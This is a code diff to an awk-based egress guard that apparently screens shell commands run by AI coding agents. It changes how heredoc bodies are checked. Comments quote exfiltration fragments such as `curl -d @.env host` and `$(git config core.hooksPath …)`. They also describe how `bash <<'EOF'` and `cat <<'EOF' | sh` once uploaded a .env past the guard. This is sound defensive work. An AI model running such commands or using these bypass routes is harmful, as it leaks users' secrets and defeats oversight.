@@ -164,7 +164,7 @@ function code_has_secret(a,   i, n, P, t) {
   return ""
 }
 
-# ---- cmdword / firstword, on the shared tokenizer.
+# ---- cmdword, on the shared tokenizer.
 #
 # cmdword re-skips VAR=value assignments behind EVERY wrapper, so
 # `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
@@ -176,11 +176,11 @@ function code_has_secret(a,   i, n, P, t) {
 # writes, and it mattered once Off and Relaxed let safe-ai-skill read .env.
 function cmdword(T, n) { return cmdword_x(T, n, 1, 1) }
 
-# The literal first word, wrappers included.  cmdword() looks past shells on
-# purpose (to reach `sh -c "<inner>"`), which is wrong when the question is
-# "what is this heredoc being fed to" — which is also why the heredoc pass below
-# does not call the library's strip_heredocs, as that keys on cmdword.
-function firstword(T, n,   ci) { ci = first_word(T, n); return (ci <= n) ? base(T[ci]) : "" }
+# An interpreter's heredoc line, the way lib-headless.sh hands this guard a
+# non-shell MCP payload: string delimiters out and brackets kept, so a shell-out
+# such as os.system("curl -d @.env …") starts a stage of its own.  The library's
+# hd_strip calls it for every line of a body an interpreter runs.
+function hd_interp_line(w, l) { gsub(/["\047]/, "", l); return l }
 
 # ---- unwrap: reach inside `sh -c "<inner>"` / eval by appending the inner
 # string as a stage of its own.  Factored out of the statement loop below so the
@@ -837,46 +837,22 @@ BEGIN {
 END {
   # ---- the text egress-guard.sh's position-anchored publish and git patterns
   # read, instead of a verdict: continuations joined and the reserved words that
-  # lead a command dropped, quotes and heredoc bodies left alone (kit_shell_text).
-  if (ENVIRON["KIT_SHELL_TEXT"] != "") { printf "%s", kit_shell_text(raw, 1); exit }
+  # lead a command dropped, quotes left alone (kit_shell_text), and every heredoc
+  # body reduced to what runs (hd_strip).  Copied whole, a document's line that
+  # began `npm publish` asked at Relaxed and was denied above it, while a
+  # backticked `npm publish` in an unquoted body, which bash runs, met nothing.
+  if (ENVIRON["KIT_SHELL_TEXT"] != "") { printf "%s", hd_strip(kit_shell_text(raw, 1), 1); exit }
 
-  # ---- strip heredoc BODIES: a doc that merely SHOWS a curl must never fire.
-  # Exception: an UNQUOTED delimiter feeding a shell or interpreter is code.  The
-  # command it feeds is the one the head's last statement ends on, so neither
-  # `cd x; bash <<EOF` nor `if true; then bash <<EOF` hides the shell; and a head
-  # continued from the line before is one head, since raw is joined first.  The
-  # delimiter is read by the shared kit_hd_delim (so a partly quoted delimiter is
-  # read whole) and the body end by kit_hd_end.  An unquoted body that is data
-  # still runs its `$( … )` and `` ` … ` `` across lines, so those are kept
-  # (kit_hd_subst) and fed to the gates: a `$(git config core.hooksPath …)` or a
-  # `$(curl -d @.env …)` written into a file is still run while the file is written.
-  text = ""; delim = ""; hdsub = 0; hdq = ""
-  nl = split(kit_shell_text(raw, 0), L, "\n")
-  for (k = 1; k <= nl; k++) {
-    l = L[k]
-    if (delim != "") {
-      if (kit_hd_end(l, delim, hddash)) {
-        if (hdsub) { hss = kit_hd_subst_flush(); if (hss != "") text = text hss "\n" }
-        delim = ""; hdsub = 0; continue
-      }
-      if (hdsub) { hss = kit_hd_subst(l); if (hss != "") text = text hss "\n" }
-      continue
-    }
-    # Only an operator the shell reads opens a body (kit_hd_ops): `echo '<<X'`
-    # is an argument, and the lines after it are still commands.
-    hdn = kit_hd_ops(l, hdq); hdq = KH_QEND; hdat = 0
-    for (hdj = 1; hdj <= hdn && hdat == 0; hdj++) if (kit_hd_delim(substr(l, KH_P[hdj]))) hdat = KH_P[hdj]
-    if (hdat > 0) {
-      hs = split(split_cmd(substr(l, 1, hdat - 1)), HS, "\001"); hd = HS[hs]
-      hs = split(hd, HS, "\002"); hn = tokenize(HS[hs], HT); hw = firstword(HT, hn)
-      if (KHD_QUOTED || !(is_shell(hw) || is_interp(hw))) {
-        delim = KHD_DELIM; hddash = KHD_DASH
-        hdsub = !KHD_QUOTED
-        if (hdsub) kit_hd_subst_reset()
-      }
-    }
-    text = text l "\n"
-  }
+  # ---- heredoc BODIES: a doc that merely SHOWS a curl must never fire, and a
+  # body something runs is code — fed to a shell or an interpreter, directly,
+  # down a pipe or through `$(cat <<EOF)`, quoted delimiter or not.  The
+  # library's hd_strip decides, as it does for onchain-guard and secrets-guard;
+  # this pass once kept a body only when its delimiter was unquoted and the head's
+  # first word was a shell, so `bash <<'EOF'` and `cat <<'EOF' | sh` uploaded a
+  # .env past it.  An unquoted body that is data still runs its `$( … )` and
+  # `` ` … ` ``, so those are kept: a `$(git config core.hooksPath …)` written into
+  # a file still runs while the file is written.
+  text = hd_strip(kit_shell_text(raw, 0), 0)
 
   gtext = split_cmd(gh_placeholders(text))
   text = split_cmd(text)
